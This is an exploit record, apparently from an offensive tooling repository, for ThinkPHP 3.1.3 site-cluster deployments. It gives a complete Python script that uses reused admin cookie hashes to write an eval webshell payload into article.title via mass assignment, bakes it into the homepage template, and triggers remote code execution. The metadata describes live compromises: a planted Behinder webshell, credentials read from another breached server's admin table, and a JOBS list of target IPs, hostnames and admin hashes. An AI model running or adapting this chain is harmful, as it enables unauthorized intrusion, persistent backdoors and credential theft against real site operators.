# ThinkPHP3.1.3 站群通用链：后台 mass assignment 写 article.title → 零凭证 get_html1 模板烘焙 → 首页 RCE

- **code**: thinkphp3.1.3-站群通用链-后台-mass-assignment-写-article.title-零凭证-get_html1-模板烘焙-首页-rce
- **kind**: exp
- **category**: rce
- **component**: ThinkPHP 3.1.3 站群（天花板/大白菜/送钱宝宝/聚宝阁 同 CORE_DB 族）
- **versions**: ThinkPHP 3.1.3 + PHP 5.6.40（宝塔/aapanel + nginx + openresty）
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.3 实测打穿：POST add 回显 {"ba_id":14062,"ok":1,"ms":"编辑成功"}；List 页出现 <span style="color:blue;width:calc(100% - 96px);"><php>@eval($_POST[1]);</php></span>；get_html1 → {"ok":1,"msg":"成功请刷新"}；GET / = 200/341411；POST /example.com 传 1=echo 'RCE78_'.md5('ok').'_END'; 回显 RCE78_444bcb3a3fcf8389296c49467f27e1d6_END。随后落冰蝎马 http://203.0.113.3/Public/www/main_r3_d2bab066.php 实测 uid=1000 / php 5.6.40。凭据对来自 176 已控 RCE 读 today 库 admin 表（the#e8a3d8da… / admin#776bdea7… / thb001-010#7d0c9a06…）。
- **path**: pocs/thinkphp3.1.3-站群通用链-后台-mass-assignment-写-article.title-零凭证-get_html1-模板烘焙-首页-rce/tp31_article_title_to_rce.py
- **tags**: thinkphp,站群,模板注入,模板烘焙,mass-assignment,get_html1,凭据复用,rce,全站群通用
- **created_at**: 2026-10-13T12:24:22.876Z
- **found_by**: exploit

## 描述

零凭证 + 后台 mass assignment 写 article.title，再用零凭证 get_html1 把 List 页烘焙成首页模板，最终经模板编译执行任意 PHP。全程不需要上传、不需要目标管理员交互。

## 用法

```
python tp31_article_title_to_rce.py
需替换的参数：JOBS 里的 (ip, scheme, host, admin_user, admin_hash)。
关键约束：
· 每次请求必须带正确 Host（vhost 隔离，Host 错返回 503/530/529）
· 必须 --noproxy / ProxyHandler({}) 绕开本机系统代理
· 凭据判读必须用全新 Session —— Home/ArticleAction::_initialize() 成功分支会 session('admin_user',…)，而 $auser = $_SESSION['admin_user'] ?: $_COOKIE['admin_user']，同 session 后续请求会全部"成功"（session 污染假象）
· 触发 RCE 的 Host 不能含 'sp' 也不能含 'example'（否则渲染 indexapp / indexalert，看不到执行效果）
· RCE 触发窗口：站点 cron 约每 30 分钟重跑 get_html1 重写模板；但 article.title 里的 payload 持久存在，故每次重跑都会重新写入含 payload 的模板，实际长期有效
· system/exec/shell_exec 在该族被 disable_functions 禁用（实测 system('id') 空回显），但 eval 可用；取证改用 echo php_uname()/phpversion()/is_writable()
```

## 正文

```
#!/usr/bin/env python3
# 全站群通用链：后台凭据 → article.title 写入 payload → get_html1 烘焙模板 → RCE
# 依赖：requests；必须逐请求带正确 Host（该族节点多为 vhost 隔离，Host 不对返回 503/530/529）
import requests, time, hashlib
PX = {"http": None, "https": None}          # 本机系统代理会干扰，全部绕开
UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"

def exploit(ip, scheme, host, admin_user, admin_hash, payload="<php>@eval($_POST[1]);</php>"):
    BASE = "%s://%s" % (scheme, ip)
    H = {"Host": host, "User-Agent": UA}
    CK = {"admin_user": admin_user, "admin_id": admin_hash}
    S = requests.Session(); S.trust_env = False

    # 0) 凭据 oracle：Home/Article::_initialize() 无 Host 校验，失败恒定 200/3B "502"
    r = S.get(BASE + "/example.com?g=Home&m=Article&a=edit_cont&id=5", headers=H, cookies=CK,
              timeout=25, verify=False, allow_redirects=False, proxies=PX)
    if len(r.content) <= 10:
        print("[-] 凭据无效（仍是 502）"); return None
    print("[+] 凭据有效，后台会话建立  len=%d" % len(r.content))

    # 1) mass assignment 写 article.title（$arr=$_POST; add($arr)）
    #    不传 id => add() 新增；topublic=1 使文章进入 List 页 cont2 渲染集（$jq: stop=0 AND topublic=1）
    #    title 在渲染点 {$id5['title']|htmlspecialchars_decode} 会被 htmlspecialchars_decode 还原
    data = {"title": payload, "cid": "5102", "cont": "x", "cont1": "x", "stop": "0",
            "topublic": "1", "status": "1", "cyid": "0", "sort": "99999"}
    r2 = S.post(BASE + "/example.com?g=Home&m=Article&a=edit_cont",
                headers=dict(H, **{"Referer": BASE + "/"}), cookies=CK, data=data,
                timeout=30, verify=False, allow_redirects=False, proxies=PX)
    print("[+] 写入 article.title ->", r2.text[:120])

    # 2) oracle：List 页必须【原样】出现 payload（不能是 &lt;php&gt;）
    g = S.get(BASE + "/example.com?g=Home&m=List&a=index&type=0", headers=H, timeout=30,
              verify=False, allow_redirects=False, proxies=PX).text
    if "<php>@eval" not in g:
        print("[-] List 页未原样渲染 payload（检查渲染点是否带 |htmlspecialchars_decode）"); return None
    print("[+] List 页已原样渲染 payload")

    # 3) 零凭证烘焙模板：抓取 http://vggc.<cfg_siteurl3>/List/index/type/0（*.abrdns.com 自指解析=抓自己）
    r3 = S.get(BASE + "/example.com?g=Home&m=Order&a=get_html1", headers=H, timeout=45,
               verify=False, allow_redirects=False, proxies=PX)
    print("[+] get_html1 ->", r3.text[:80])

    # 4) 用「第三者 Host」触发：Home/Index::index() 里
    #    Host 含 'sp' → display('indexapp')；含 'example' → display('indexalert')；否则 display() = 被覆盖的模板
    r4 = S.post(BASE + "/example.com", headers=dict(H, **{"Content-Type": "application/x-www-form-urlencoded"}),
                data={"1": "echo 'RCE_'.md5('ok').'_END';"}, timeout=45, verify=False,
                allow_redirects=False, proxies=PX)
    return r4.text if "RCE_" in r4.text else None

if __name__ == "__main__":
    # 实测有效的跨节点凭据对（176 admin 表 → 78/84/131/7/160）
    JOBS = [
        ("203.0.113.3",  "http", "thbac1dsua6v.fwjpnbbpq6.xyz", "the",   "e8a3d8da126fbe80564309f709a539f2"),
        ("203.0.113.4",  "http", "dby1lue9xo.5848whqvguq.xyz",  "admin", "776bdea736fdc83d433a624dcb688656"),
        ("203.0.113.114",  "http", "dbc1bflc8k.g6i73anzp4.xyz",   "admin", "776bdea736fdc83d433a624dcb688656"),
        ("203.0.113.115",    "http", "dbc2bflc8k.g6i73anzp4.xyz",   "admin", "776bdea736fdc83d433a624dcb688656"),
        ("203.0.113.99", "https","zsogv1w9lo.5q3z6ru9xk.xyz",   "admin", "776bdea736fdc83d433a624dcb688656"),
    ]
    for job in JOBS:
        print("=== %s ===" % job[0])
        try:
            print(exploit(*job) and "★RCE OK")
        except Exception as e:
            print("ERR", type(e).__name__, e)
        time.sleep(3)

```
